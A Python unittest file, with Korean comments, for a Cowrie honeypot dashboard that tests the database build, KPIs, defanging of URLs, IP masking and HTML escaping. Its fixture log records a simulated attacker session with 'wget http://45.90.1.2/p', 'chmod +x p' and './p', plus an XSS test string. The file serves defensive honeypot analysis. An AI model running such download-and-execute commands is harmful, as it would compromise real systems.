"""streamlit_app/build_db.py와 data.py 테스트. 임시 로그·DB만 쓴다."""
from contextlib import closing
from datetime import date
from hashlib import sha256
import json
from pathlib import Path
import sqlite3
import sys
import tempfile
import unittest

import ingest
from match_signatures import load_rules

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'streamlit_app'))
import build_db  # noqa: E402
import data as D  # noqa: E402


def ev(eventid, session, ts, **kw):
    return {'eventid': eventid, 'session': session, 'timestamp': ts, 'sensor': 'seoul', **kw}


# 2026-11-01 15:30Z = 11-02 00:30 KST
SEOUL_LOG = [
    ev('cowrie.session.connect', 'a1', '2026-11-01T00:00:00.000000Z', src_ip='5.6.7.8', protocol='telnet'),
    ev('cowrie.login.failed', 'a1', '2026-11-01T00:00:01.000000Z', src_ip='5.6.7.8', username='root', password='1234'),
    ev('cowrie.login.success', 'a1', '2026-11-01T00:00:02.000000Z', src_ip='5.6.7.8', username='root', password='root'),
    ev('cowrie.command.input', 'a1', '2026-11-01T00:00:03.000000Z', src_ip='5.6.7.8', input='wget http://45.90.1.2/p -O p'),
    ev('cowrie.session.file_download', 'a1', '2026-11-01T00:00:04.000000Z', src_ip='5.6.7.8',
       url='http://45.90.1.2/p', shasum='ab' * 32, outfile='var/lib/cowrie/downloads/' + 'ab' * 32),
    ev('cowrie.command.input', 'a1', '2026-11-01T00:00:05.000000Z', src_ip='5.6.7.8', input='chmod +x p'),
    ev('cowrie.command.input', 'a1', '2026-11-01T00:00:06.000000Z', src_ip='5.6.7.8', input='./p'),
    ev('cowrie.session.file_download.failed', 'a1', '2026-11-01T00:00:07.000000Z', src_ip='5.6.7.8',
       url='ftp://45.90.1.2/x', error='timeout'),
    ev('cowrie.session.closed', 'a1', '2026-11-01T00:00:08.000000Z', src_ip='5.6.7.8'),
    ev('cowrie.session.connect', 'b2', '2026-11-01T15:30:00.000000Z', src_ip='5.6.7.8', protocol='ssh'),
    ev('cowrie.login.failed', 'b2', '2026-11-01T15:30:01.000000Z', src_ip='5.6.7.8', username='admin', password='admin'),
    ev('cowrie.session.closed', 'b2', '2026-11-01T15:30:02.000000Z', src_ip='5.6.7.8'),
    # 테스트 IP: ingest가 excluded=1로 표시 → 대시보드에서 빠진다
    ev('cowrie.session.connect', 't3', '2026-11-01T01:00:00.000000Z', src_ip='211.238.109.139', protocol='ssh'),
    ev('cowrie.login.success', 't3', '2026-11-01T01:00:01.000000Z', src_ip='211.238.109.139', username='me', password='x'),
    ev('cowrie.session.closed', 't3', '2026-11-01T01:00:02.000000Z', src_ip='211.238.109.139'),
]


def syd_db(path):
    with closing(sqlite3.connect(path)) as con, con:
        con.executescript(ingest.SCHEMA)
        con.execute("INSERT INTO sessions (source, session_id, src_ip, protocol, start_ts, end_ts, login_success, "
                    "username, password, n_commands, excluded) VALUES "
                    "('syd','s1','5.6.7.8','telnet','2026-10-31T00:00:00Z','2026-10-31T00:00:09Z',1,'root','root',1,0)")
        con.execute("INSERT INTO commands VALUES ('syd','s1','2026-10-31T00:00:05Z','uname -a')")
        con.execute("INSERT INTO downloads VALUES ('syd','s1','2026-10-31T00:00:06Z','http://1.1.1.1/y','cd'||'00')")


class DashboardBuildAndDataTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        t = Path(cls.tmp.name)
        logs = t / 'logs'
        logs.mkdir()
        (logs / 'cowrie.json').write_text('\n'.join(json.dumps(e) for e in SEOUL_LOG), encoding='utf-8')
        cls.syd = t / 'syd.db'
        syd_db(cls.syd)
        geo = t / 'geo.csv'
        geo.write_text('5.6.7.0,5.6.7.255,DE\n1.1.1.0,1.1.1.255,AU\n', encoding='utf-8')
        cls.before = {p: sha256(p.read_bytes()).hexdigest() for p in (cls.syd, logs / 'cowrie.json')}
        cls.out = t / 'dash'
        build_db.build(cls.out, logs, cls.syd, geo, log=lambda *_: None)
        cls.rules = load_rules(ROOT / 'signatures/rules.yaml')
        cls.ds = D.load(cls.out, cls.rules)

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def f(self, start=date(2026, 10, 31), end=date(2026, 11, 2), full=False, sources=('seoul', 'syd')):
        return D.Filters(sources, ('ssh', 'telnet'), start, end, full)

    def test_inputs_untouched(self):
        self.assertEqual({p: sha256(p.read_bytes()).hexdigest() for p in self.before}, self.before)

    def test_build_contents(self):
        with closing(sqlite3.connect(self.out / 'dashboard.db')) as con:
            logins = con.execute('SELECT session_id, success FROM login_events ORDER BY ts').fetchall()
            self.assertEqual(logins, [('a1', 0), ('a1', 1), ('b2', 0)])  # 테스트 세션 t3는 제외
            kinds = dict(con.execute('SELECT kind, count(*) FROM file_events GROUP BY kind').fetchall())
            self.assertEqual(kinds, {'download': 1, 'download_failed': 1})
            self.assertEqual(dict(con.execute('SELECT ip, country FROM geo').fetchall())['5.6.7.8'], 'DE')
            self.assertIn(('seoul', 'a1', 'S01'), con.execute('SELECT source, session_id, rule_id FROM hits').fetchall())
            raw = dict(con.execute('SELECT source, has_raw_logs FROM sources').fetchall())
            self.assertEqual(raw, {'seoul': 1, 'syd': 0})

    def test_scope_kst_and_kpis(self):
        sc = D.scope(self.ds, self.f(date(2026, 11, 2), date(2026, 11, 2)))
        self.assertEqual(list(sc.sessions['session_id']), ['b2'])  # 15:30Z = 다음 날 KST
        k = D.kpis(D.scope(self.ds, self.f()))
        self.assertEqual((k['sessions'], k['ips'], k['auth'], k['auth_success']), (3, 1, 3, 1))
        self.assertEqual(k['priority'], 1)

    def test_auth_unknown_without_raw_logs(self):
        sc = D.scope(self.ds, self.f(sources=('syd',)))
        self.assertIsNone(D.kpis(sc)['auth'])
        self.assertIsNone(D.auth_summary(sc))

    def test_compare_previous_period(self):
        f = self.f(date(2026, 11, 1), date(2026, 11, 1))
        prev = D.compare(self.ds, f)
        self.assertEqual(prev['sessions'], 1)  # 10-31 KST의 시드니 세션
        self.assertIsNone(D.compare(self.ds, self.f(date(2026, 10, 31), date(2026, 10, 31))))  # 데이터 시작 이전
        self.assertIsNone(D.compare(self.ds, self.f(full=True)))

    def test_files_and_new_items(self):
        sc = D.scope(self.ds, self.f())
        fs = D.file_summary(sc)
        self.assertEqual((fs['downloads'], fs['failed'], fs['unique_hashes']), (2, 1, 2))
        self.assertIn('p', set(fs['files']['name']))
        new = D.new_items(self.ds, D.scope(self.ds, self.f(date(2026, 11, 1), date(2026, 11, 2))))
        self.assertEqual((new['mode'], new['ips']), ('신규', 0))  # 같은 IP가 10-31에 시드니에 왔다
        self.assertEqual(D.new_items(self.ds, D.scope(self.ds, self.f(full=True)))['mode'], '누적')

    def test_priority_and_descriptions(self):
        sc = D.scope(self.ds, self.f())
        table, recent = D.priority_summary(sc, self.rules)
        self.assertEqual(table.set_index('rule_id').loc['S01', 'sessions'], 1)
        self.assertEqual(recent['behaviors'].iloc[0], '다운로드 후 실행')
        self.assertEqual(D.describe_command(self.rules, 'uname -a')[1:], ('규칙 일치', ['B01']))
        self.assertEqual(D.describe_command(self.rules, 'enable')[:2], ('장비 셸 진입 시도', '입력 기반 추정'))

    def test_recent_commands_masked(self):
        rc = D.recent_commands(D.scope(self.ds, self.f()), self.rules)
        wget = rc[rc['command'].str.startswith('wget')].iloc[0]
        self.assertEqual(wget['command_view'], 'wget hxxp://45.90.x.x/p -O p')
        self.assertEqual(wget['ip_masked'], '5.6.x.x')

    def test_ip_and_session_detail(self):
        ip = D.ip_detail(self.ds, '5.6.7.8')
        self.assertEqual(ip['sources'], ['seoul', 'syd'])
        self.assertEqual(ip['days'], 3)
        s = D.session_detail(self.ds, 'seoul', 'a1')
        self.assertEqual(len(s['logins']), 2)
        self.assertEqual(s['evidence'][0]['rule_id'], 'S01')
        self.assertEqual(set(s['files']['kind']), {'download', 'download_failed'})
        self.assertIsNone(D.session_detail(self.ds, 'seoul', 'nope'))

    def test_source_split_concentration_and_common_rules(self):
        sc = D.scope(self.ds, self.f())
        split = D.source_split(sc).set_index('source')
        self.assertEqual(split.loc['seoul', 'sessions'], 2)
        self.assertAlmostEqual(split['percent'].sum(), 100.0)
        conc = D.ip_concentration(sc)
        self.assertEqual((conc['ips'], conc['top1_ip']), (1, '5.6.7.8'))
        self.assertAlmostEqual(conc['top1'], 100.0)
        self.assertAlmostEqual(conc['parts']['percent'].sum(), 100.0)
        top = D.behavior_top(sc, self.rules, top=30, exclude=D.COMMON_RULES)
        self.assertNotIn('B19', set(top['rule_id']))
        self.assertEqual([r['rule_id'] for r in D.common_rule_share(sc, self.rules)], ['B19'])

    def test_session_list_filters(self):
        sc = D.scope(self.ds, self.f())
        self.assertEqual(len(D.session_list(sc, self.rules)), 3)
        self.assertEqual(list(D.session_list(sc, self.rules, priority_only=True)['session_id']), ['a1'])
        self.assertEqual(set(D.session_list(sc, self.rules, commands_only=True)['session_id']), {'a1', 's1'})
        self.assertEqual(list(D.session_list(sc, self.rules, rule_ids=('B01',))['session_id']), ['s1'])
        self.assertEqual(list(D.session_list(sc, self.rules, login=False)['session_id']), ['b2'])
        self.assertEqual(len(D.session_list(sc, self.rules, ip_query='9.9.9')), 0)
        top = D.session_list(sc, self.rules).iloc[-1]
        self.assertEqual(top['session_id'], 's1')  # 최신 순 정렬: 10-31 세션이 마지막

    def test_session_events_merged_in_order(self):
        ev = D.session_events(self.ds, 'seoul', 'a1')
        self.assertEqual(list(ev['kind']), ['인증 실패', '인증 성공', '명령', '다운로드', '명령', '명령', '다운로드 실패'])
        self.assertEqual(list(ev.loc[ev['kind'] == '명령', 'index']), ['#0', '#1', '#2'])
        self.assertIn('hxxp://45.90.1.2/p', ev.loc[ev['kind'] == '다운로드', 'detail'].iloc[0])
        self.assertIn('timeout', ev.loc[ev['kind'] == '다운로드 실패', 'detail'].iloc[0])

    def test_ip_list_and_files(self):
        sc = D.scope(self.ds, self.f())
        ips = D.ip_list(sc)
        self.assertEqual(ips.iloc[0]['sessions'], 3)
        self.assertEqual(ips.iloc[0]['sources'], '서울, 시드니')
        self.assertEqual(int(D.ip_daily(self.ds, '5.6.7.8')['sessions'].sum()), 3)
        cat = D.file_catalog(sc)
        self.assertEqual(len(cat), 2)
        obs = D.file_observations(sc, 'ab' * 32)
        self.assertEqual(list(obs['session_id']), ['a1'])
        self.assertEqual(len(D.failed_downloads(sc)), 1)

    def test_session_story_plain_language(self):
        import story as S
        groups = S.flow(self.ds, 'seoul', 'a1', self.rules)
        steps = [g['step'] for g in groups]
        self.assertEqual(steps[:3], ['login', 'login', 'tool'])  # 실패·성공 로그인은 각각 한 줄
        self.assertIn('run', steps)
        sm = S.summary(self.ds, 'seoul', 'a1', self.rules, groups)
        self.assertIn('로그인을 1번 실패한 뒤 `root / root`로 로그인에 성공했습니다.', sm['sentence'])
        self.assertEqual(sm['danger'], ['다운로드 후 실행'])
        html = S.flow_html(groups)
        self.assertIn('hxxp://45.90.1.2/p', html)
        self.assertNotIn('http://', html)
        self.assertEqual(S.explain(self.rules, 'chmod +x p')[0], 'run')
        self.assertEqual(S.explain(self.rules, 'enable')[:3], ('shell', '공유기·IoT 장비의 관리자 명령 모드로 들어가려 함', '입력 기반 추정'))
        # 공격자 문자열은 escape된다
        groups[0]['raws'] = ['<script>alert(1)</script>']
        self.assertIn('&lt;script&gt;', S.flow_html(groups))

    def test_display_helpers(self):
        self.assertEqual(D.defang('a\x00 HTTPS://1.2.3.4/x'), 'a\\x00 hxxps://1.2.x.x/x')
        self.assertEqual(D.defang('tftp://1.2.3.4', mask_ips=False), 'txftp://1.2.3.4')
        self.assertEqual(D.file_name(None, 'var/' + 'ab' * 32), 'ababababab…ababab')


if __name__ == '__main__':
    unittest.main()
